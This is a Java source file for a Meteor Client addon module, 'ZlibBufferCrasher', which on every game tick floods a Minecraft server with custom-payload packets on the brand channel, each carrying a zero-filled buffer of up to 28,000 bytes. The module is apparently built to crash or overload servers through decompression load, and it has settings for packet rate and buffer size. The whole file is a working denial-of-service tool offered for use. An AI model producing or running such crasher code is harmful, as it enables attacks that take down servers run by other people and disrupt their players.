package com.x310.clarity.modules.crashers;

import com.x310.clarity.Main;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.codec.PacketCodec;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import net.minecraft.network.packet.CustomPayload;
import net.minecraft.util.Identifier;
import java.util.Arrays;

public class ZlibBufferCrasher extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> packetsPerTick = sgGeneral.add(new IntSetting.Builder()
        .name("packets-per-tick")
        .defaultValue(10)
        .min(1)
        .sliderMax(100)
        .build()
    );

    private final Setting<Integer> bufferSize = sgGeneral.add(new IntSetting.Builder()
        .name("buffer-size-kb")
        .defaultValue(16)
        .min(1)
        .sliderMax(32) 
        .build()
    );

    public static final Identifier PACKET_ID = Identifier.of("minecraft", "brand");
    public static final CustomPayload.Id<ZlibPayload> PAYLOAD_ID = new CustomPayload.Id<>(PACKET_ID);
  
    public static final PacketCodec<PacketByteBuf, ZlibPayload> CODEC = CustomPayload.codecOf(
        ZlibPayload::write, 
        ZlibPayload::new
    );

    public ZlibBufferCrasher() {
        super(Main.CRASH_GROUP, "zlib-buffer-crasher", "Advanced Compression Inflation.");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.getNetworkHandler() == null) return;

        int size = Math.min(bufferSize.get() * 1024, 28000);
        byte[] junk = new byte[size];
        Arrays.fill(junk, (byte) 0);

        for (int i = 0; i < packetsPerTick.get(); i++) {
            try {
                mc.getNetworkHandler().sendPacket(new CustomPayloadC2SPacket(new ZlibPayload(junk)));
            } catch (Exception ignored) {}
        }
    }

    private record ZlibPayload(byte[] data) implements CustomPayload {
        public ZlibPayload(PacketByteBuf buf) {
            this(buf.readByteArray());
        }

        private void write(PacketByteBuf buf) {
            buf.writeBytes(data);
        }

        @Override
        public CustomPayload.Id<? extends CustomPayload> getId() {
            return PAYLOAD_ID;
        }
    }
}
